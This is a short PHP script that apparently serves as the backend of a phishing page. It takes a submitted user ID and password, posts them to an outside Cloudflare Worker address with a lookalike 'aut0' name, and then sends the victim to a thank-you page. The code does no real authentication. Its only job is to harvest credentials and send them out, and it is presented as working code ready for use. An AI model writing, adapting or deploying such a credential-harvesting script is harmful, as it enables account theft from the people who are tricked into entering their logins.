<?php
// Get JSON input from the request
$data = json_decode(file_get_contents("php://input"), true);

// Extract userID and password from the form
$userID = isset($data['userID']) ? $data['userID'] : '';
$password = isset($data['password']) ? $data['password'] : '';

// Check if both fields are filled
if (!empty($userID) && !empty($password)) {
    // Prepare data to send to your Cloudflare Worker
    $postData = json_encode([
        'userID' => $userID,
        'password' => $password
    ]);

    // Your Cloudflare Worker URL
    $workerUrl = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";

    // Initialize cURL
    $ch = curl_init($workerUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    // Execute request and get response
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect after successful submission
    header("Location: ./thanks.html");
    exit();
} else {
    // If missing fields, redirect back to login
    header("Location: ./index.html");
    exit();
}
?>
